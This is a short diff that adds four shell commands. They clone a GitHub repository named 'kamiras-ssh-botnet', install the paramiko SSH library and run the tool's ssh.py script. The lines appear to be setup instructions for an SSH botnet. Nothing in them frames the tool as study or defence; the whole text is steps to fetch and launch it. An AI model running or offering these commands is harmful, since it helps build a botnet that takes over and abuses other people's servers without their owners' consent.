@@ -1,0 +1,4 @@
+git clone https://github.com/kamiras/kamiras-ssh-botnet.git
+pip install paramiko
+python ssh.py
+python3 ssh.py
